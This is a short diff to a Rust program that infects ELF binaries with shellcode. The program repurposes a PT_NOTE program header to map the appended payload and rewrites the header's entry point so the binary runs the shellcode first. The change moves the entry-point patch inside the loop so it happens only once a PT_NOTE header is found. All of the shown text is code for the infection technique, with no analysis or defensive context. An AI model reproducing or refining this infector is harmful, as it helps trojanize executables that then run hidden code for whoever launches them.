@@ -42,9 +42,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let file_offset = elf_fd.metadata()?.len() - sc_len;
     let memory_offset = 0xc00000000 + file_offset;
 
-    // Patch the ELF header to start at the shellcode
-    elf_header.e_entry = memory_offset;
-
     // Look for a PT_NOTE section
     for phdr in &mut program_headers {
         if phdr.p_type == PT_NOTE {
@@ -56,6 +53,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             phdr.p_vaddr = memory_offset;
             phdr.p_memsz += sc_len as u64;
             phdr.p_filesz += sc_len as u64;
+            // Patch the ELF header to start at the shellcode
+            elf_header.e_entry = memory_offset;
             break;
         }
     }
